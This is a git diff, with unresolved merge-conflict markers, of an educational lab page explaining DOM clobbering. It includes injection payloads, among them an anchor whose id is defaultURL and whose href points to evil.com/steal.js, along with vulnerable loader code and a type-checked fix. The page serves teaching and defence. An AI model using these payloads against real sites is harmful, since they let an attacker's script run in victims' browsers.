@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<<<<<<< HEAD
   <title>Lab 3: DOM Clobbering | CyberConnect Sandbox</title>
   <link rel="stylesheet" href="assets/css/style.css">
   <link rel="stylesheet" href="assets/css/lab3.css">
@@ -311,6 +312,353 @@
           42 Amman / 42 Irbid &bull; Lab 03: DOM Clobbering &bull; Pure Client-Side HTML, CSS &amp; JavaScript.
         </p>
       </div>
+=======
+  <title>Lab 3 — DOM Clobbering | SecLabs</title>
+  <link rel="stylesheet" href="assets/css/style.css">
+  <link rel="stylesheet" href="assets/css/lab3.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+</head>
+<body>
+
+  <!-- ==================== NAV ==================== -->
+  <nav class="nav">
+    <div class="nav__inner">
+      <a href="index.html" class="nav__logo"></a>
+      <ul class="nav__links">
+        <li><a href="index.html">Home</a></li>
+        <li><a href="lab1.html">Clickjacking</a></li>
+        <li><a href="lab2.html">Open Redirect</a></li>
+        <li><a href="lab3.html" class="active">DOM Clobbering</a></li>
+      </ul>
+      <button class="nav__hamburger" aria-label="Toggle menu" aria-expanded="false">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </nav>
+
+  <main>
+    <div class="container">
+
+      <!-- ==================== HEADER ==================== -->
+      <div class="lab-header">
+        <div class="lab-header__meta">
+          <div class="lab-header__icon" style="background:rgba(168,85,247,0.12); border:1px solid rgba(168,85,247,0.25);">
+            🧬
+          </div>
+          <div>
+            <h1 style="font-size:clamp(1.6rem,4vw,2.2rem); margin-bottom:4px;">DOM Clobbering</h1>
+            <div style="display:flex; gap:8px; flex-wrap:wrap;">
+              <span class="badge badge--red">CWE-79</span>
+              <span class="badge badge--orange">OWASP A03:2021 — Injection</span>
+            </div>
+          </div>
+        </div>
+
+        <div style="display:flex; gap:12px; flex-wrap:wrap; margin-top:16px;">
+          <a href="lab2.html" class="btn btn--ghost btn--sm">← Open Redirect</a>
+          <a href="index.html" class="btn btn--secondary btn--sm">Back to Home</a>
+        </div>
+      </div>
+
+      <!-- ==================== 1. WHAT IT IS ==================== -->
+      <section class="lab-section animate-in">
+        <h3 class="lab-section__title">
+          <span class="lab-section__number">1</span>
+          What It Is
+        </h3>
+        <p style="color:var(--text); font-size:0.95rem; line-height:1.75; margin-bottom:16px;">
+          Browsers have a legacy behavior: any HTML element with an
+          <code style="color:var(--cyan)">id</code> attribute automatically becomes
+          accessible as a property on the <code style="color:var(--cyan)">window</code> object.
+          For example, <code>&lt;img id="banner"&gt;</code> creates <code>window.banner</code>
+          pointing to that element.
+        </p>
+        <p style="color:var(--text); font-size:0.95rem; line-height:1.75; margin-bottom:16px;">
+          <strong>DOM Clobbering</strong> exploits this. If an attacker can inject HTML into the page
+          (even through a sanitizer that blocks <code>&lt;script&gt;</code> tags), they can
+          create an element whose <code>id</code> matches a variable name the app relies on. The
+          browser then overwrites ("clobbers") that variable with the DOM element, hijacking the
+          application's logic.
+        </p>
+        <p style="color:var(--text-muted); font-size:0.9rem; line-height:1.75;">
+          This attack does <em>not</em> require injecting JavaScript — just plain HTML with
+          the right <code>id</code> or <code>name</code> attributes.
+        </p>
+      </section>
+
+      <!-- ==================== STEP-BY-STEP BREAKDOWN ==================== -->
+      <section class="lab-section animate-in">
+        <h3 class="lab-section__title">
+          <span class="lab-section__number">2</span>
+          How the Attack Works — Step by Step
+        </h3>
+
+        <!-- Step 1: Where injection happens -->
+        <div style="margin-bottom:24px;">
+          <h4 style="color:var(--cyan); font-size:0.95rem; margin-bottom:10px;">
+            Step 1 — The injection point
+          </h4>
+          <p style="color:var(--text); font-size:0.9rem; line-height:1.7; margin-bottom:12px;">
+            Many web apps allow some user HTML — comment sections, rich-text editors, email
+            renderers, or CMS widgets. These features usually run through a sanitizer that strips
+            <code>&lt;script&gt;</code> tags, <code>onerror</code> attributes, and
+            <code>javascript:</code> URLs. But most sanitizers <strong>allow</strong>
+            <code>id</code> and <code>name</code> attributes because they seem harmless.
+          </p>
+          <div class="code-block">
+            <div class="code-block__header">
+              <div class="code-block__dot"><span></span><span></span><span></span></div>
+              <span class="code-block__title">user-comment.html — where HTML gets injected</span>
+            </div>
+            <pre><span class="line"><span class="cmt">&lt;!-- The app renders user-submitted HTML here --&gt;</span></span>
+<span class="line"><span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="val">"comment-body"</span><span class="tag">&gt;</span></span>
+<span class="line"></span>
+<span class="line">  <span class="cmt">&lt;!-- Sanitizer allows this — no scripts, just an &lt;a&gt; tag --&gt;</span></span>
+<span class="line line--highlight">  <span class="tag">&lt;a</span> <span class="attr">id</span>=<span class="val">"defaultURL"</span> <span class="attr">href</span>=<span class="val">"https://evil.com/steal.js"</span><span class="tag">&gt;&lt;/a&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span class="tag">&lt;/div&gt;</span></span></pre>
+          </div>
+          <p style="color:var(--text-muted); font-size:0.85rem; margin-top:8px;">
+            The injected <code>&lt;a&gt;</code> tag looks innocent. No script, no event handler.
+            The sanitizer lets it through.
+          </p>
+        </div>
+
+        <!-- Step 2: What the browser does -->
+        <div style="margin-bottom:24px;">
+          <h4 style="color:var(--cyan); font-size:0.95rem; margin-bottom:10px;">
+            Step 2 — The browser creates a global variable
+          </h4>
+          <p style="color:var(--text); font-size:0.9rem; line-height:1.7; margin-bottom:12px;">
+            Per the HTML spec, the browser now creates <code style="color:var(--cyan)">window.defaultURL</code>
+            pointing to that <code>&lt;a&gt;</code> element. This is automatic — no JavaScript
+            needed. If any code later reads <code>window.defaultURL</code>, it gets the DOM
+            element instead of <code>undefined</code> (or whatever the developer expected).
+          </p>
+          <div class="code-block">
+            <div class="code-block__header">
+              <div class="code-block__dot"><span></span><span></span><span></span></div>
+              <span class="code-block__title">browser console — before vs. after injection</span>
+            </div>
+            <pre><span class="line"><span class="cmt">// BEFORE the malicious comment is posted:</span></span>
+<span class="line"><span class="fn">console</span>.<span class="fn">log</span>(<span class="fn">window</span>.defaultURL);  <span class="cmt">// → undefined</span></span>
+<span class="line"></span>
+<span class="line"><span class="cmt">// AFTER the &lt;a id="defaultURL" ...&gt; is in the DOM:</span></span>
+<span class="line line--highlight"><span class="fn">console</span>.<span class="fn">log</span>(<span class="fn">window</span>.defaultURL);  <span class="cmt">// → &lt;a&gt; element</span></span>
+<span class="line"><span class="fn">console</span>.<span class="fn">log</span>(<span class="fn">window</span>.defaultURL.href);</span>
+<span class="line"><span class="cmt">// → "https://evil.com/steal.js"</span></span></pre>
+          </div>
+        </div>
+
+        <!-- Step 3: The app reads the clobbered value -->
+        <div style="margin-bottom:24px;">
+          <h4 style="color:var(--cyan); font-size:0.95rem; margin-bottom:10px;">
+            Step 3 — The app reads the clobbered value
+          </h4>
+          <p style="color:var(--text); font-size:0.9rem; line-height:1.7; margin-bottom:12px;">
+            The app's JavaScript uses a common fallback pattern:
+            <code style="color:var(--orange)">window.X || "default"</code>.
+            Because the <code>&lt;a&gt;</code> element is <strong>truthy</strong>, the
+            <code>||</code> fallback is never reached. The app now uses the attacker's value.
+          </p>
+          <div class="code-block">
+            <div class="code-block__header">
+              <div class="code-block__dot"><span></span><span></span><span></span></div>
+              <span class="code-block__title">app.js — the vulnerable code</span>
+            </div>
+            <pre><span class="line"><span class="kw">function</span> <span class="fn">loadAnalytics</span>() {</span>
+<span class="line line--highlight">  <span class="kw">let</span> url = <span class="fn">window</span>.defaultURL || <span class="str">"https://safe-cdn.com/a.js"</span>;</span>
+<span class="line">  <span class="cmt">// url is now the &lt;a&gt; element, NOT the safe string!</span></span>
+<span class="line"></span>
+<span class="line">  <span class="kw">let</span> script = document.<span class="fn">createElement</span>(<span class="str">'script'</span>);</span>
+<span class="line">  script.src = url;  <span class="cmt">// toString() → "https://evil.com/steal.js"</span></span>
+<span class="line">  document.head.<span class="fn">appendChild</span>(script);</span>
+<span class="line">  <span class="cmt">// ⚠️ Attacker's script is now loaded and executing!</span></span>
+<span class="line">}</span></pre>
+          </div>
+          <p style="color:var(--text-muted); font-size:0.85rem; margin-top:8px;">
+            <strong style="color:var(--red)">Key insight:</strong>
+            When an <code>&lt;a&gt;</code> element is used as a string (e.g., assigned to
+            <code>script.src</code>), the browser calls <code>.toString()</code> on it, which
+            returns its <code>href</code> — the attacker's URL.
+          </p>
+        </div>
+
+        <!-- Summary diagram -->
+        <div style="padding:16px; background:rgba(168,85,247,0.06); border:1px solid rgba(168,85,247,0.2); border-radius:var(--radius-sm);">
+          <h4 style="color:var(--purple); font-size:0.9rem; margin-bottom:10px;">Attack Flow Summary</h4>
+          <p style="color:var(--text); font-size:0.88rem; line-height:1.7; margin:0;">
+            <span style="color:var(--cyan)">①</span> Attacker posts HTML with
+            <code>&lt;a id="defaultURL" href="evil.com"&gt;</code> →
+            <span style="color:var(--cyan)">②</span> Sanitizer allows it (no script tag) →
+            <span style="color:var(--cyan)">③</span> Browser creates
+            <code>window.defaultURL</code> = the element →
+            <span style="color:var(--cyan)">④</span> App reads
+            <code>window.defaultURL || fallback</code> →
+            <span style="color:var(--red)">⑤</span> Element is truthy, fallback
+            skipped → attacker's URL is used.
+          </p>
+        </div>
+      </section>
+
+      <!-- ==================== 3. TRY IT ==================== -->
+      <section class="lab-section animate-in">
+        <h3 class="lab-section__title">
+          <span class="lab-section__number">3</span>
+          Try It
+        </h3>
+        <p style="color:var(--text-muted); font-size:0.9rem; margin-bottom:16px;">
+          Each payload below simulates a different injection scenario. The sandbox shows the
+          variable state before and after injection so you can see exactly what gets clobbered.
+        </p>
+
+        <!-- Toggle -->
+        <div class="toggle" style="margin-bottom:20px;">
+          <span class="toggle__label toggle__label--vuln">Vulnerable</span>
+          <label class="toggle__switch">
+            <input type="checkbox" id="dc-toggle">
+            <span class="toggle__slider"></span>
+          </label>
+          <span class="toggle__label toggle__label--fix">Fixed</span>
+        </div>
+
+        <!-- DOM Viewer -->
+        <div class="dom-viewer">
+          <div class="dom-viewer__header">
+            <span>🔬</span>
+            <span>DOM Inspector</span>
+          </div>
+          <div class="dom-viewer__body" id="dc-viewer-body">
+            <p style="color:var(--text-dim); font-size:0.9rem; text-align:center; padding:40px 20px;">
+              Click a payload button below to run the demo
+            </p>
+          </div>
+        </div>
+
+        <!-- Payload buttons -->
+        <div class="payload-group">
+          <button class="payload-btn dc-payload"
+                  data-payload='<img id="config" src="x">'
+                  data-label="config">
+            &lt;img id="config"&gt; — clobber config object
+          </button>
+          <button class="payload-btn dc-payload"
+                  data-payload='<a id="defaultURL" href="https://evil.com/steal.js">'
+                  data-label="url">
+            &lt;a id="defaultURL"&gt; — hijack script URL
+          </button>
+          <button class="payload-btn dc-payload"
+                  data-payload='<form id="settings"><input name="apiKey" value="ATTACKER_KEY"></form>'
+                  data-label="form">
+            &lt;form id="settings"&gt; — clobber nested property
+          </button>
+        </div>
+
+        <!-- Result -->
+        <div class="result-box" id="dc-result">
+          <span style="color:var(--text-dim)">Click a payload button above to run the demo.</span>
+        </div>
+
+        <button id="dc-reset" class="btn btn--ghost btn--sm" style="margin-top:12px;">↺ Reset Demo</button>
+      </section>
+
+      <!-- ==================== 4. WHY IT MATTERS ==================== -->
+      <section class="lab-section animate-in">
+        <h3 class="lab-section__title">
+          <span class="lab-section__number">4</span>
+          Why It Matters
+        </h3>
+        <p style="color:var(--text); font-size:0.95rem; line-height:1.75; margin-bottom:12px;">
+          DOM Clobbering is dangerous precisely because it's subtle. It doesn't require
+          <code>&lt;script&gt;</code> tags, so it bypasses most HTML sanitizers. An attacker
+          can hijack configuration objects, redirect script loads to malicious URLs, or
+          override security checks — all with elements that look harmless.
+        </p>
+        <p style="color:var(--text-muted); font-size:0.9rem; line-height:1.75;">
+          <strong style="color:var(--orange);">Real incident:</strong>
+          In 2020, security researcher Michał Bentkowski reported a DOM Clobbering vulnerability
+          in Gmail's AMP4Email implementation. By injecting HTML with specific <code>id</code>
+          attributes, it was possible to bypass the AMP sandbox and achieve XSS in the
+          Gmail context. Google awarded a bug bounty for this finding.
+        </p>
+      </section>
+
+      <!-- ==================== 5. THE FIX ==================== -->
+      <section class="lab-section animate-in">
+        <h3 class="lab-section__title">
+          <span class="lab-section__number">5</span>
+          The Fix
+        </h3>
+        <p style="color:var(--text-muted); font-size:0.9rem; margin-bottom:16px;">
+          Two defenses work together: declare variables in block scope (so the browser can't
+          shadow them), and type-check any value read from <code>window</code>.
+        </p>
+
+        <div class="code-block">
+          <div class="code-block__header">
+            <div class="code-block__dot"><span></span><span></span><span></span></div>
+            <span class="code-block__title">app-fixed.js</span>
+          </div>
+          <pre><span class="line"><span class="cmt">// IIFE / module prevents global scope pollution</span></span>
+<span class="line">(<span class="kw">function</span>() {</span>
+<span class="line line--fix">  <span class="kw">const</span> DEFAULT_URL = <span class="str">"https://safe-cdn.com/a.js"</span>;</span>
+<span class="line"></span>
+<span class="line">  <span class="kw">function</span> <span class="fn">loadAnalytics</span>() {</span>
+<span class="line">    <span class="kw">let</span> candidate = <span class="fn">window</span>.defaultURL;</span>
+<span class="line"></span>
+<span class="line line--fix">    <span class="kw">if</span> (<span class="kw">typeof</span> candidate !== <span class="str">'string'</span>) {</span>
+<span class="line">      candidate = DEFAULT_URL; <span class="cmt">// ← reject non-strings</span></span>
+<span class="line">    }</span>
+<span class="line"></span>
+<span class="line">    <span class="kw">let</span> script = document.<span class="fn">createElement</span>(<span class="str">'script'</span>);</span>
+<span class="line">    script.src = candidate;</span>
+<span class="line">    document.head.<span class="fn">appendChild</span>(script);</span>
+<span class="line">  }</span>
+<span class="line">})();</span></pre>
+        </div>
+
+        <p style="color:var(--text-muted); font-size:0.88rem; margin-top:12px;">
+          <strong style="color:var(--green)">Why it works:</strong>
+          <code style="color:var(--cyan)">typeof candidate !== 'string'</code> catches clobbered
+          values — DOM elements are objects, not strings. The <code>const</code> declaration in a
+          closure ensures the fallback URL can't be clobbered. Even if
+          <code>window.defaultURL</code> is an HTMLElement, the type check rejects it.
+        </p>
+
+        <p style="color:var(--text-muted); font-size:0.88rem; margin-top:8px;">
+          👆 <strong>Toggle "Fixed" above</strong> and try the same payloads — the clobbering is blocked.
+        </p>
+      </section>
+
+      <!-- ==================== 6. SOURCES ==================== -->
+      <section class="lab-section animate-in">
+        <h3 class="lab-section__title">
+          <span class="lab-section__number">6</span>
+          Sources
+        </h3>
+        <ul class="sources-list">
+          <li><a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noopener">PortSwigger — DOM Clobbering</a></li>
+          <li><a href="https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object" target="_blank" rel="noopener">HTML Living Standard — Named access on the Window object</a></li>
+          <li><a href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation</a></li>
+          <li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/" target="_blank" rel="noopener">Securitum — XSS in AMP4Email via DOM Clobbering</a></li>
+          <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP — DOM Clobbering Prevention Cheat Sheet</a></li>
+        </ul>
+      </section>
+
+    </div>
+  </main>
+
+  <!-- ==================== FOOTER ==================== -->
+  <footer class="footer">
+    <div class="container">
+      <ul class="footer__links">
+        <li><a href="index.html">Home</a></li>
+        <li><a href="lab1.html">Clickjacking</a></li>
+        <li><a href="lab2.html">Open Redirect</a></li>
+        <li><a href="lab3.html">DOM Clobbering</a></li>
+      </ul>
+      <p>SecLabs — Educational web security labs. All attacks are simulated.</p>
+>>>>>>> 3861762 (ahmad commit)
     </div>
   </footer>
 
